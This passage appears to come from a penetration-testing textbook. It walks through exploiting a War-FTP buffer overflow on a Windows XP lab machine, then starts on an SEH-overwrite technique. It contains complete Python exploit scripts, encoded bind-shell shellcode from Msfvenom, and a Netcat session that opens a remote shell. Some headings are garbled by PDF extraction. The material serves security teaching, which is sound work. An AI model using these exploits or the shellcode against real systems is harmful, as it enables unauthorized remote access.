quite. Unfortunately, if we just hardcode the address 00AFFD48 into our 
return address, the exploit may work just fine for us but not in other cases‚Äî
and we want it to work as universally as possible. As we saw in Chapter 16, 
the locations of registers like ESP can change based on program factors 
such as the length of provided arguments or because the stack is tied to a 
thread, which means the stack address can differ the next time you attack 
the application. Lucky for us, jumping to a CPU register to execute its contents is denoted by the assembly language instruction JMP ESP (or another 
register name, as needed). In pre-ASLR operating systems, such as our 
Windows XP SP3 target, Windows DLLs were loaded into the same place 
in memory every time. That means if we find a JMP ESP inside an executable 
module on our Windows XP target, it should be in the same place on every 
Windows XP SP3 English-language machine. 
For that matter, JMP ESP is not our only option. As long as we end up with 
execution pointed to ESP, we can use an equivalent instruction to JMP ESP or 
even a series of instructions. For example, CALL ESP will work, or PUSH ESP followed by RET, which sends execution to the memory address in ESP. 
We can find all the occurrences of JMP ESP and the logical equivalents in 
the executable modules for War-FTP with the command !mona jmp -r esp, as 
shown in Figure 17-11. 
392 Chapter 17
Figure 17-11: Searching for JMP ESP with Mona 
The results are written to C:\logs\war-ftpd\jmp.txt. We are presented with 
84 possible JMP ESP (or equivalent) instructions. Some may contain bad 
characters (as we‚Äôll discuss later in the chapter)‚Äîwhich instructions should 
we choose? As a rule of thumb, go for modules that belong to the application itself and not to the operating system. If that is not possible, try relatively stable modules such MSVCRT.dll because very few changes have been 
made to this module in Windows patches compared with other Windows 
modules (although changes are still possible based on the language of the 
operating system). The JMP ESP instructions Mona found in MSVCRT.dll are 
shown next. 
0x77c35459 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False, 
SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)
0x77c354b4 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False, 
SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)
0x77c35524 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False, 
SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)
0x77c51025 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False, 
SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)
A Stack-Based Buffer Overflow in Windows 393
Let‚Äôs use the first one: the PUSH ESP followed by a RET at 0x77C35459. As in 
Chapter 16, we can set a breakpoint to pause execution when we reach our 
instructions to redirect execution to ESP and make sure everything is working correctly before we replace our Cs with instructions to be executed. 
Set a breakpoint at the memory address 0x77C35459 with the command bp
0x77C35459 in Immunity Debugger, as shown in Figure 17-12. (To view all currently set breakpoints, go to View4Breakpoints in Immunity Debugger.)
Figure 17-12: Breakpoints in Immunity Debugger 
Now replace the four Bs in your exploit string with the location of the 
redirection to ESP, as shown in Listing 17-5. 
root@kali:~# cat ftpexploit
#!/usr/bin/python
import socket
buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "D" * 607 u
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
394 Chapter 17
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-5: Using a return address from an executable module
With a breakpoint prepared, let‚Äôs place our new return address at the 
right location in our attack string at u and change the 611 Cs to four Cs 
followed by 607 Ds to account for the four bytes of the attack string before 
ESP. Once the attack string is in place, run the exploit against War-FTP, 
and see if it reaches our breakpoint in Immunity Debugger, as shown in 
Figure 17-13.
Figure 17-13: We reached our breakpoint. 
Perfect‚Äînotice in the bottom of the Immunity Debugger window that 
we hit our breakpoint. 
N ote If you forget to take endianness into account, you might not reach your breakpoint;
instead, the program will crash with an access violation at 5954C377. Be sure to flip 
the bytes around to little-endian format. 
A Stack-Based Buffer Overflow in Windows 395
The next command to be executed is shown in the top left of the 
Immunity Debugger window in the CPU pane. Use F7 to execute one command at a time rather than have the program continue running normally. 
We press F7 twice to execute the PUSH ESP and RET instructions, and, as 
expected, execution is redirected to the beginning of our Ds (44 in hex), 
as shown in Figure 17-14. 
Figure 17-14: Redirecting execution to our attack string 
Getting a She
Now we just need to put something useful in place of the Ds from the 
previous section for the CPU to execute on our behalf. In Chapter 4, we 
used the Metasploit tool Msfvenom to generate malicious executables. We 
can also use it to create raw shellcode to put in our handwritten exploits. 
For instance, we can tell our hijacked CPU to open a bind shell on TCP 
port 4444 (or any other port) by using Msfvenom to generate the shellcode 
for a Metasploit payload. 
We need to tell Msfvenom the payload to use‚Äîin this case windows/
shell_bind_tcp, the inline Windows command shell. We also need to provide 
it with the maximum size we can have for our shellcode. 
396 Chapter 17
N ote As you experiment with crashing War-FTP, you will notice that you can actually make
the attack string slightly bigger, but things start to act strangely around 1,150 characters. (We will see what this is all about in Chapter 18.) At 1,100 characters we are 
safe, and our exploit will work as expected each time. 
Our current exploit string has 607 Ds, so we have 607 bytes for our 
shellcode. Finally, we need to tell Msfvenom which special characters to 
avoid when creating the payload. In this case, we need to avoid the null byte 
(\x00), carriage return (\x0d), line feed (\x0a), and @ (\x40).
N ote Finding bad characters is an advanced topic beyond the scope of this book, so just
trust me that these are the right ones for this exploit. These bad characters make 
sense: The null byte terminates a string, carriage return and line feed denote 
a new line, and @ will break the user@server syntax for an FTP login. For 
more information on this topic, check out my blog post ‚ÄúFinding Bad Characters 
with Immunity Debugger and Mona.py‚Äù (http://www.bulbsecurity.com/
finding-bad-characters-with-immunity-debugger-and-mona-py/).
Feed this information into Msfvenom, as shown in Listing 17-6. 
root@kali:~# msfvenom -p windows/shell_bind_tcp -s 607 -b '\x00\x40\x0a\x0d'
[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)
buf = 
"\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\xb2\xdb\x61\x30" +
"\x52\x92\x8a\xc9\xa2\xc5\x03\x2c\x93\xd7\x70\x24\x81\xe7" +
"\xf3\x68\x29\x83\x56\x99\xba\xe1\x7e\xae\x0b\x4f\x59\x81" +
"\x8c\x61\x65\x4d\x4e\xe3\x19\x8c\x82\xc3\x20\x5f\xd7\x02" +
"\x64\x82\x17\x56\x3d\xc8\x85\x47\x4a\x8c\x15\x69\x9c\x9a" +
"\x25\x11\x99\x5d\xd1\xab\xa0\x8d\x49\xa7\xeb\x35\xe2\xef" +
"\xcb\x44\x27\xec\x30\x0e\x4c\xc7\xc3\x91\x84\x19\x2b\xa0" +
"\xe8\xf6\x12\x0c\xe5\x07\x52\xab\x15\x72\xa8\xcf\xa8\x85" +
"\x6b\xad\x76\x03\x6e\x15\xfd\xb3\x4a\xa7\xd2\x22\x18\xab" +
"\x9f\x21\x46\xa8\x1e\xe5\xfc\xd4\xab\x08\xd3\x5c\xef\x2e" +
"\xf7\x05\xb4\x4f\xae\xe3\x1b\x6f\xb0\x4c\xc4\xd5\xba\x7f" +
"\x11\x6f\xe1\x17\xd6\x42\x1a\xe8\x70\xd4\x69\xda\xdf\x4e" +
"\xe6\x56\xa8\x48\xf1\x99\x83\x2d\x6d\x64\x2b\x4e\xa7\xa3" +
"\x7f\x1e\xdf\x02\xff\xf5\x1f\xaa\x2a\x59\x70\x04\x84\x1a" +
"\x20\xe4\x74\xf3\x2a\xeb\xab\xe3\x54\x21\xda\x23\x9b\x11" +
"\x8f\xc3\xde\xa5\x3e\x48\x56\x43\x2a\x60\x3e\xdb\xc2\x42" +
"\x65\xd4\x75\xbc\x4f\x48\x2e\x2a\xc7\x86\xe8\x55\xd8\x8c" +
"\x5b\xf9\x70\x47\x2f\x11\x45\x76\x30\x3c\xed\xf1\x09\xd7" +
"\x67\x6c\xd8\x49\x77\xa5\x8a\xea\xea\x22\x4a\x64\x17\xfd" +
"\x1d\x21\xe9\xf4\xcb\xdf\x50\xaf\xe9\x1d\x04\x88\xa9\xf9" +
"\xf5\x17\x30\x8f\x42\x3c\x22\x49\x4a\x78\x16\x05\x1d\xd6" +
"\xc0\xe3\xf7\x98\xba\xbd\xa4\x72\x2a\x3b\x87\x44\x2c\x44" +
"\xc2\x32\xd0\xf5\xbb\x02\xef\x3a\x2c\x83\x88\x26\xcc\x6c" +
"\x43\xe3\xfc\x26\xc9\x42\x95\xee\x98\xd6\xf8\x10\x77\x14" +
"\x05\x93\x7d\xe5\xf2\x8b\xf4\xe0\xbf\x0b\xe5\x98\xd0\xf9" +
"\x09\x0e\xd0\x2b"
Listing 17-6: Generating shellcode with Msfvenom
A Stack-Based Buffer Overflow in Windows 397
Msfvenom generated our shellcode in 368 bytes, leaving us plenty of 
room to spare. Replace the Ds in the exploit with the generated shellcode, 
as shown in Listing 17-7. 
root@kali:~# cat ftpexploit
#!/usr/bin/python
import socket
shellcode = ("\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\xb2\xdb\x61\x30" +
"\x52\x92\x8a\xc9\xa2\xc5\x03\x2c\x93\xd7\x70\x24\x81\xe7" +
"\xf3\x68\x29\x83\x56\x99\xba\xe1\x7e\xae\x0b\x4f\x59\x81" +
"\x8c\x61\x65\x4d\x4e\xe3\x19\x8c\x82\xc3\x20\x5f\xd7\x02" +
"\x64\x82\x17\x56\x3d\xc8\x85\x47\x4a\x8c\x15\x69\x9c\x9a" +
"\x25\x11\x99\x5d\xd1\xab\xa0\x8d\x49\xa7\xeb\x35\xe2\xef" +
"\xcb\x44\x27\xec\x30\x0e\x4c\xc7\xc3\x91\x84\x19\x2b\xa0" +
"\xe8\xf6\x12\x0c\xe5\x07\x52\xab\x15\x72\xa8\xcf\xa8\x85" +
"\x6b\xad\x76\x03\x6e\x15\xfd\xb3\x4a\xa7\xd2\x22\x18\xab" +
"\x9f\x21\x46\xa8\x1e\xe5\xfc\xd4\xab\x08\xd3\x5c\xef\x2e" +
"\xf7\x05\xb4\x4f\xae\xe3\x1b\x6f\xb0\x4c\xc4\xd5\xba\x7f" +
"\x11\x6f\xe1\x17\xd6\x42\x1a\xe8\x70\xd4\x69\xda\xdf\x4e" +
"\xe6\x56\xa8\x48\xf1\x99\x83\x2d\x6d\x64\x2b\x4e\xa7\xa3" +
"\x7f\x1e\xdf\x02\xff\xf5\x1f\xaa\x2a\x59\x70\x04\x84\x1a" +
"\x20\xe4\x74\xf3\x2a\xeb\xab\xe3\x54\x21\xda\x23\x9b\x11" +
"\x8f\xc3\xde\xa5\x3e\x48\x56\x43\x2a\x60\x3e\xdb\xc2\x42" +
"\x65\xd4\x75\xbc\x4f\x48\x2e\x2a\xc7\x86\xe8\x55\xd8\x8c" +
"\x5b\xf9\x70\x47\x2f\x11\x45\x76\x30\x3c\xed\xf1\x09\xd7" +
"\x67\x6c\xd8\x49\x77\xa5\x8a\xea\xea\x22\x4a\x64\x17\xfd" +
"\x1d\x21\xe9\xf4\xcb\xdf\x50\xaf\xe9\x1d\x04\x88\xa9\xf9" +
"\xf5\x17\x30\x8f\x42\x3c\x22\x49\x4a\x78\x16\x05\x1d\xd6" +
"\xc0\xe3\xf7\x98\xba\xbd\xa4\x72\x2a\x3b\x87\x44\x2c\x44" +
"\xc2\x32\xd0\xf5\xbb\x02\xef\x3a\x2c\x83\x88\x26\xcc\x6c" +
"\x43\xe3\xfc\x26\xc9\x42\x95\xee\x98\xd6\xf8\x10\x77\x14" +
"\x05\x93\x7d\xe5\xf2\x8b\xf4\xe0\xbf\x0b\xe5\x98\xd0\xf9" +
"\x09\x0e\xd0\x2b")
buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + shellcode 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-7: Our finished exploit 
When you try running the exploit, something unexpected happens. 
Though we are still able to hit our breakpoint and redirect execution to our 
shellcode, War-FTP crashes before we receive our bind shell on port 4444. 
Something in the shellcode is causing a crash, as shown in Figure 17-15. 
398 Chapter 17
Figure 17-15: War-FTP crashes 
Msfvenom‚Äôs encoded shellcode needs to first decode itself before 
executing, and as part of the decoding process, it needs to find its location in memory using a routine called getPC. A common technique for 
finding the current location in memory includes using an instruction 
called FSTENV, which writes a structure onto the stack, overwriting what‚Äôs 
there‚Äîin our case part of the shellcode. All we need to do to fix this is 
move ESP away from the shellcode, so getPC has room to work without 
corrupting our shellcode. (The problem in general is that if the values in 
EIP and ESP are too close together, shellcode tends to corrupt itself, either 
during decoding or during execution.) This is what caused our crash in 
the previous run. 
We can use the Metasm utility to turn a simple assembly instruction 
into shellcode that we can drop into our exploit. We need to move ESP 
away from our shellcode in memory. We can do this using the assembly ADD
instruction. The syntax is ADD destination, amount. Because our stack consumes lower memory addresses, let‚Äôs subtract 1,500 bytes from ESP. The 
number of bytes should be large enough to avoid corruption; 1,500 bytes is 
usually a safe choice. 
Change directories to /usr/share/metasploit-framework/tools and start 
metasm_shell.rb, as shown in Listing 17-8. 
A Stack-Based Buffer Overflow in Windows 399
root@kali:~# cd /usr/share/metasploit-framework/tools/
root@kali:/usr/share/metasploit-framework/tools# ./metasm_shell.rb 
type "exit" or "quit" to quit
use ";" or "\n" for newline
metasm > sub esp, 1500u
"\x81\xec\xdc\x05\x00\x00"
metasm > add esp, -1500v
"\x81\xc4\x24\xfa\xff\xff"
Listing 17-8: Generating shellcode with Metasm
If we try sub esp, 1500 u, the resulting shellcode includes null bytes, 
and, as discussed earlier, a null byte is a bad character that needs to be 
avoided due to the FTP specification. Instead, enter add esp, -1500 v
(a logical equivalent) into the metasm prompt. 
Now add the resulting shellcode to the exploit right before the windows/
shell_bind_tcp shellcode, as shown in Listing 17-9. 
#!/usr/bin/python
import socket
shellcode = ("\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\xb2\xdb\x61\x30" +
"\x52\x92\x8a\xc9\xa2\xc5\x03\x2c\x93\xd7\x70\x24\x81\xe7" +
"\xf3\x68\x29\x83\x56\x99\xba\xe1\x7e\xae\x0b\x4f\x59\x81" +
"\x8c\x61\x65\x4d\x4e\xe3\x19\x8c\x82\xc3\x20\x5f\xd7\x02" +
"\x64\x82\x17\x56\x3d\xc8\x85\x47\x4a\x8c\x15\x69\x9c\x9a" +
"\x25\x11\x99\x5d\xd1\xab\xa0\x8d\x49\xa7\xeb\x35\xe2\xef" +
"\xcb\x44\x27\xec\x30\x0e\x4c\xc7\xc3\x91\x84\x19\x2b\xa0" +
"\xe8\xf6\x12\x0c\xe5\x07\x52\xab\x15\x72\xa8\xcf\xa8\x85" +
"\x6b\xad\x76\x03\x6e\x15\xfd\xb3\x4a\xa7\xd2\x22\x18\xab" +
"\x9f\x21\x46\xa8\x1e\xe5\xfc\xd4\xab\x08\xd3\x5c\xef\x2e" +
"\xf7\x05\xb4\x4f\xae\xe3\x1b\x6f\xb0\x4c\xc4\xd5\xba\x7f" +
"\x11\x6f\xe1\x17\xd6\x42\x1a\xe8\x70\xd4\x69\xda\xdf\x4e" +
"\xe6\x56\xa8\x48\xf1\x99\x83\x2d\x6d\x64\x2b\x4e\xa7\xa3" +
"\x7f\x1e\xdf\x02\xff\xf5\x1f\xaa\x2a\x59\x70\x04\x84\x1a" +
"\x20\xe4\x74\xf3\x2a\xeb\xab\xe3\x54\x21\xda\x23\x9b\x11" +
"\x8f\xc3\xde\xa5\x3e\x48\x56\x43\x2a\x60\x3e\xdb\xc2\x42" +
"\x65\xd4\x75\xbc\x4f\x48\x2e\x2a\xc7\x86\xe8\x55\xd8\x8c" +
"\x5b\xf9\x70\x47\x2f\x11\x45\x76\x30\x3c\xed\xf1\x09\xd7" +
"\x67\x6c\xd8\x49\x77\xa5\x8a\xea\xea\x22\x4a\x64\x17\xfd" +
"\x1d\x21\xe9\xf4\xcb\xdf\x50\xaf\xe9\x1d\x04\x88\xa9\xf9" +
"\xf5\x17\x30\x8f\x42\x3c\x22\x49\x4a\x78\x16\x05\x1d\xd6" +
"\xc0\xe3\xf7\x98\xba\xbd\xa4\x72\x2a\x3b\x87\x44\x2c\x44" +
"\xc2\x32\xd0\xf5\xbb\x02\xef\x3a\x2c\x83\x88\x26\xcc\x6c" +
"\x43\xe3\xfc\x26\xc9\x42\x95\xee\x98\xd6\xf8\x10\x77\x14" +
"\x05\x93\x7d\xe5\xf2\x8b\xf4\xe0\xbf\x0b\xe5\x98\xd0\xf9" +
"\x09\x0e\xd0\x2b")
buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff" + shellcode
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
400 Chapter 17
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-9: Exploit with ESP moved out of the way
With ESP out of the way, and knowing that our shellcode won‚Äôt be corrupted in the process of being decoded or executed, run the exploit again 
and use Netcat on Kali Linux to connect to TCP port 4444 on the Windows 
target, as shown here.
root@kali:~# nc 192.168.20.10 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\Documents and Settings\Georgia\Desktop>
Sure enough, we now have a shell on the Windows target, as shown by 
the Windows command prompt above.
Summar
In this chapter we used our knowledge from Chapter 16 to exploit a realworld vulnerable program: the War-FTP program with a buffer overflow 
issue in the Username field. We crashed the program and located the return 
address, and then, instead of hardcoding a memory address for the overwritten return address, we found a JMP ESP instruction in a loaded DLL. We 
then filled the attacker-controlled ESP register with shellcode generated by 
Msfvenom. Now we‚Äôve managed to hijack control of a real program. 
In the next chapter, we will look at another Windows exploitation technique, structured exception handler overwrites. 
18
S truc turd E xc e
Han  lerOv erwri t e
When something goes wrong and causes a program to 
crash, it has caused an exception. Accessing an invalid 
memory location is one type of exception a program 
can encounter. 
Windows systems use a method called structured exception handlers (SEH)
to deal with program exceptions as they arise. SEH are similar to try/catch 
blocks in Java: Code is executed, and if something goes wrong, the function 
stops executing and passes execution to SEH. 
Each function can have its own SEH registration entry. An SEH registration record is eight bytes long, consisting of a pointer to the next SEH record 
(NSEH) followed by the memory address of the exception handler, as illustrated in Figure 18-1. The list of all the SEH entries is the SEH chain. 
402 Chapter 18
pointer to the next SEH record
SEH handler
pointer to the next SEH record
SEH handler
FFFFFFFF
SEH handler
Figure 18-1: SEH structure 
In many cases, an application uses only the operating system‚Äôs SEH 
entry to handle exceptions. You are probably already familiar with this 
usage; it puts up a message box with something like ‚ÄúApplication X has 
encountered a problem and needs to close.‚Äù However, programs can also 
specify custom SEH entries. When an exception is encountered, execution will be passed to the SEH chain to look for an entry that can handle 
the exception. To view the SEH chain for an application in Immunity 
Debugger, go to View4SEH chain, as illustrated in Figure 18-2.
Figure 18-2: Viewing the SEH chain
Structured Exception Handler Overwrites 403
SEH Overwrite Exp
Now let‚Äôs look at using SEH entries to take control of a program. A natural 
question when working through the War-FTP buffer overflow example in 
Chapter 17 would be, Why are we limited to 607 bytes for our shellcode? 
Why can‚Äôt we write an even longer attack string and create a payload that‚Äôs 
as long as we like?
We‚Äôll begin our exploration of SEH overwrites with the exploit we used 
to crash War-FTP. Instead of the 1,100-byte exploit string that we used in 
the example in Chapter 17, let‚Äôs try crashing War-FTP with a 1,150-byte 
string of As, as shown in Listing 18-1. 
root@kali:~# cat ftpexploit2
#!/usr/bin/python
import socket
buffer = "A" * 1150
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-1: War-FTP exploit with 1,150 As
As shown in Figure 18-3, the program crashes as expected, but this 
time our access violation is a bit different from the one in Chapter 17. EIP 
points to 0x77C3F973, a valid instruction inside MSVCRT.dll. Instead of overwriting the saved return pointer and crashing the program with EIP control, War-FTP crashed writing to memory address 0x00B00000. 
Notice in the CPU pane that the instruction at 0x77C3F973 is MOV BYTE PTR 
DS:[EAX], 0. Basically, the program is trying to write to the memory location of the value of EAX. Looking at the top right of Immunity Debugger, the 
Registers pane, we see EAX contains the value 00B00000. Something about our 
attack string seems to have corrupted EAX, because the program is now trying to write to a memory location that is not writable. Without EIP control, 
is this crash still viable? Really long attack strings frequently cause an exception by trying to write data off the end of the stack. 
Before we write off this exploit and move on, take a look at the SEH 
chain. As shown in Figure 18-4, the structured exception handler has 
been overwritten with As. Recall that in the event of a crash, execution 
is passed to SEH. Though we were not able to control EIP directly at the 
time of the crash, perhaps controlling SEH will allow us to still hijack 
execution. 
404 Chapter 18
Figure 18-3: A program crashes without EIP control. 
Figure 18-4: SEH overwritten
Just as we used Mona to create a cyclic pattern to see which four bytes 
overwrote the saved return pointer in the previous chapter, we will find 
which four As are overwriting SEH using the command !mona pattern_create 
1150 in Immunity Debugger, as shown in Figure 18-5.
Structured Exception Handler Overwrites 405
Figure 18-5: Generating a cyclic pattern with Mona 
Copy the resulting pattern from C:\logs\war-ftpd\pattern.txt into the 
exploit in place of the 1,150 As, as shown in Listing 18-2. 
root@kali:~# cat ftpexploit2
#!/usr/bin/python
import socket
u buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2
Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8
Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4
Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0
Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6
Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2
Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8
Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au5Au6
Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2
Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8
Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4
Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0
Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6
Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2
Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2B"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-2: Using pattern generation to pinpoint the SEH overwrite in the attack string 
406 Chapter 18
Here we‚Äôve generated a 1,150-character pattern and replaced the string 
of As at u. Next, restart War-FTP in Immunity Debugger, and run the exploit 
again. As shown in Figure 18-6, SEH is overwritten with 41317441.
Figure 18-6: SEH overwritten with Mona‚Äôs pattern
Now use !mona findmsp to find out where in our 1,150-character attack 
string the SEH entry is overwritten, as shown in Figure 18-7.
Figure 18-7: Finding the SEH overwrite in the cyclic pattern 
Structured Exception Handler Overwrites 407
Looking through the log output at C:\logs\war-ftpd\findmsp.txt, shown 
in part here, we find that the NSEH entry is overwritten 569 bytes into the 
attack string. Recall from Figure 18-1 that SEH chain entries are made up 
of eight bytes (the NSEH entry followed by the SEH pointer). Thus our SEH 
overwrite is at 573 bytes into our attack string (four bytes after NSEH).
[+] Examining SEH chain
 SEH record (nseh field) at 0x00affd94 overwritten with normal pattern : 
0x41317441 (offset 569), followed by 577 bytes of cyclic data
Passing Control to 
Back on the Windows XP target, the bottom of the Immunity Debugger 
screen shows the access violation and also notes that you can type shiftF7/F8/F9 to pass an exception to the program. In this case, the program 
will attempt to execute the memory address 41317441, the string that has 
overwritten SEH. Use shift-F9 to run the program until the next error 
occurs. As shown in Figure 18-8, the program receives an access violation 
when attempting to access the memory address 41317441. As in the previous 
examples, we will put a useful memory address in the place of 41317441 to 
successfully hijack execution. 
Also note in Figure 18-8 that when execution is passed to SEH, many 
of our registers have been zeroed out. This might make jumping to an 
attacker-controlled register more difficult. 
Figure 18-8: Execution is passed to the overwritten SEH.
408 Chapter 18
Of the registers that have not been zeroed out, none appears to point 
to a portion of our attack string. Clearly, a simple JMP ESP in SEH will not 
work to redirect execution to attacker-controlled memory. Things are still 
looking pretty bleak in our search for exploitability. 
Finding the Attack String in Memo
Of course, in this case, we already have a working saved return pointer 
overwrite exploit. However, some programs will be vulnerable only to SEH 
overwrites, so developing a method to exploit these issues is of the utmost 
importance. Luckily, an attacker-controlled memory address is on the horizon for SEH overwrites. As shown in Figure 18-9, highlight the ESP register 
in Immunity Debugger, right-click, and select Follow in Stack. 
Figure 18-9: Following ESP on the stack
Though the contents of the ESP register do not point to any part of our 
cyclic pattern, two steps down from ESP, at ESP+8, we see that memory address 
00AFD94 points to our cyclic pattern in memory, as shown in Figure 18-10. If we 
can find a way to remove two elements from the stack and then execute the 
contents of this memory address, we can execute shellcode in place of 
the pattern.
Structured Exception Handler Overwrites 409
Figure 18-10: Cyclic pattern eight bytes higher than ESP
The location of NSEH is 00AFFD94, as noted by the output of Mona‚Äôs 
findmsp command. We can verify this by right-clicking 00AFFD94 in the stack 
pane and clicking Follow in Stack, as shown in Figure 18-11. 
Figure 18-11: Cyclic pattern in the pointer to the next SEH record
410 Chapter 18
As discussed earlier, SEH entries are eight-byte-long linked lists consisting of a pointer to the next SEH record in the chain and the memory 
address of the handler on the stack. If we can load ESP+8 into EIP, we can 
execute some shellcode. Unfortunately, it looks like we have only four bytes 
to work with before we hit the SEH entry itself, but let‚Äôs deal with one problem at a time. We need to find a viable way of getting to our shellcode, and 
then we will return to making our shellcode fit into the space available.
Before we move on, let‚Äôs verify that our offsets are correct, as shown in 
Listing 18-3. 
#!/usr/bin/python
import socket
buffer = "A" * 569 + "B" * 4 + "C" * 4 + "D" * 573 u
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-3: Verifying overwrite offsets
Edit your exploit program to send over 569 As, followed by 4 Bs, followed 
by 4 Cs, and rounding out the 1,150 byte attack string with 573 Ds at u. 
Restart War-FTP and run the exploit again. We see in Figure 18-12 that 
SEH is overwritten by our 4 Cs. 
Figure 18-12: SEH is overwritten by four Cs.
Structured Exception Handler Overwrites 411
If we again type shift-F9 to pass the exception handler to the crashed 
program, War-FTP crashes a second time when accessing the memory 
address 43434343, our Cs. Now follow the ESP register in the stack. As shown 
in Figure 18-13, ESP+8 points to a memory address filled with the four Bs 
followed by our four Cs and then the Ds. 
Figure 18-13: ESP+8 is attacker controlled.
Our offsets are correct. Now to find a way to redirect execution to ESP+8. 
Unfortunately, a simple JMP ESP won‚Äôt cut it this time. 
POP PO
We need an instruction, or series of instructions, that will allow us to move 
eight bytes down the stack and then execute the contents of the memory 
address located at ESP+8. To figure out the assembly instructions we need, 
we must consider how the stack works. 
The stack is a last-in, first-out (LIFO) structure. The analogy of a stack 
of trays in a cafeteria is often used for this concept. The last tray put on the 
stack by cafeteria staff is the first one grabbed by a cafeteria patron. The 
assembly command equivalents of the tray being added to the stack and 
then picked up by a patron are PUSH and POP, respectively. 
Recall that ESP points to the top (lowest memory address) of the current stack frame. If we use the POP instruction to pop one entry (four bytes) 
off the stack, ESP will now point to ESP+4. Thus, if we execute two POP
instructions in succession, ESP will now point to ESP+8, which is exactly 
what we are going for. 
412 Chapter 18
Finally, to redirect our execution to our attacker-controlled string, 
